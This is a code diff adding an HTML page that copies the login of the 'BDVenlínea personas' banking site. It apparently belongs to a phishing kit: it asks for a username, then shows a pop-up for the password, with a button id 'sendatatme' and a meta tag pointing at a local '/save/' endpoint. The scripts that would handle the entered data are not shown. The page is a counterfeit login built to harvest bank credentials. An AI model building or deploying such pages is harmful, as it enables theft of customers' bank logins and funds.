@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BDVenlínea personas</title>
+<meta property='og:image' content='http://localhost:8080/save/'/>
+<meta property='og:url' content='http://' />
+<meta property='og:description' content=''/>
+<meta property='og:title' content=''/>
+    <!-- CUSTOM CSS -->
+    <link rel="stylesheet" type="text/css" href="./style.css" />
+    <link rel="icon" type="image/png" href="./img/bdv.png" />
+  </head>
+  <body>
+    <!-- MAIN SECTION -->
+
+    <div class="container__all">
+      <header class="container__header">
+        <div class="container__img__logo">
+          <img src="./img/personas.png" alt="logo-login" />
+        </div>
+      </header>
+      <section class="container__section">
+        <div class="container__first">
+          <input type="text" placeholder="Usuario *" id="first" />
+        </div>
+        <div class="container__next" id="button">
+          <input class="enabled" type="button" value="Entrar" id="nextwindow"/>
+        </div>
+        <div class="container__forgot">
+          <a href="#">¿Olvidaste tu usuario o clave?</a>
+        </div>
+        <div class="container__newuser">
+          <a href="#">Si eres nuevo clienteBDV regístrate aquí</a>
+        </div>
+      </section>
+    </div>
+
+    <!-- FLOATING WINDOW -->
+
+    <div class="container__background hidediv" id="windowhide">
+      <div class="container__window">
+        <div class="container__title">
+          <p>Introduce tu contraseña</p>
+        </div>
+        <div class="container__input">
+          <div class="container__second">
+            <input type="text" placeholder="Contraseña" id="second" />
+          </div>
+          <div class="container__view">
+            <img src="./img/view.png" alt="icon-view" />
+          </div>
+        </div>
+        <div class="container__required">
+          <p>Contraseña es requerida</p>
+        </div>
+        <span id="resfirst"></span>
+        <span id="resecond"></span>
+        <div class="container__gobutton" id="gobutton">
+          <input class="goenabled" type="button" value="Continuar" id="sendatatme"/>
+        </div>
+        <div class="container__cancel">
+          <input type="button" value="Cancelar" id="windowshow"/>
+        </div>
+      </div>
+    </div>
+
+    <script src="./window.js"></script>
+    <script src="./script.js"></script>
+
+  </body>
+</html>
